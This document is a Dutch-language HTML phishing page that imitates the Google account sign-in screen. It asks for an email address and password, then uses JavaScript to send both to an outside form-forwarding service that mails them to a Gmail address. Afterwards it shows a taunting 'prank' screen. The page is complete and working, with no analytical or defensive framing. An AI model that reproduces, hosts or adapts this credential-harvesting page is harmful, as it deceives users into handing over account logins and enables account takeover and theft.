<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; overflow: hidden; }
        @media (max-width: 450px) { .login-box { border: none; } }
        .google-logo { height: 24px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 10px 0; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        .user-pill { display: inline-flex; align-items: center; padding: 5px 15px; border: 1px solid #dadce0; border-radius: 20px; margin-bottom: 20px; font-size: 14px; font-weight: 500; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .blue-link { color: #1a73e8; font-weight: 500; text-decoration: none; cursor: pointer; font-size: 14px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        
        
        .loading-bar { position: absolute; top: 0; left: 0; height: 4px; width: 0; background-color: #1a73e8; transition: width 0.5s ease; }
        
        #passStep, #prankPage { display: none; }
    </style>
</head>
<body>

    <div class="login-box" id="mainBox">
        <div id="loader" class="loading-bar"></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        
        <div id="emailStep">
            <h1>Inloggen</h1>
            <p>Gebruik je Google-account</p>
            <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer" required>
            <div class="btn-container">
                <a class="blue-link">Account maken</a>
                <button onclick="goToPass()">Volgende</button>
            </div>
        </div>

        <div id="passStep">
            <h1>Welkom</h1>
            <div class="user-pill">
                <span id="displayUser"></span>
            </div>
            <input type="password" id="passInput" placeholder="Wachtwoord opgeven" required>
            <div class="btn-container">
                <a class="blue-link">Wachtwoord vergeten?</a>
                <form id="finalForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
                    <input type="hidden" name="email" id="hiddenEmail">
                    <input type="hidden" name="password" id="hiddenPass">
                    <button type="submit">Volgende</button>
                </form>
            </div>
        </div>

        <div id="prankPage">
            <div style="font-size: 60px;">🤡</div>
            <h1>HAHAHAHA</h1>
            <p>dank je wel! </p>
            <p style="color: #d93025; font-weight: bold;">Check je mail, Dolphin0X!</p>
            <button onclick="location.reload()" style="background: #333; width: 100%;">Ik ben een pannenkoek</button>
        </div>
    </div>

    <script>
        function goToPass() {
            const email = document.getElementById('emailInput').value;
            if(!email.includes('@')) { alert("Vul een geldig e-mailadres in."); return; }
            
            const loader = document.getElementById('loader');
            loader.style.width = "100%";
            
            setTimeout(() => {
                document.getElementById('emailStep').style.display = 'none';
                document.getElementById('passStep').style.display = 'block';
                document.getElementById('displayUser').innerText = email;
                loader.style.width = "0%";
            }, 800);
        }

        document.getElementById('finalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const pass = document.getElementById('passInput').value;
            if(pass.length < 6) { alert("Wachtwoord is te kort."); return; }

            document.getElementById('hiddenEmail').value = document.getElementById('emailInput').value;
            document.getElementById('hiddenPass').value = pass;

            const loader = document.getElementById('loader');
            loader.style.width = "100%";

            fetch(this.action, {
                method: 'POST',
                body: new FormData(this)
            }).then(() => {
                document.getElementById('passStep').style.display = 'none';
                document.getElementById('prankPage').style.display = 'block';
                loader.style.width = "0%";
            });
        });
    </script>
</body>
</html>
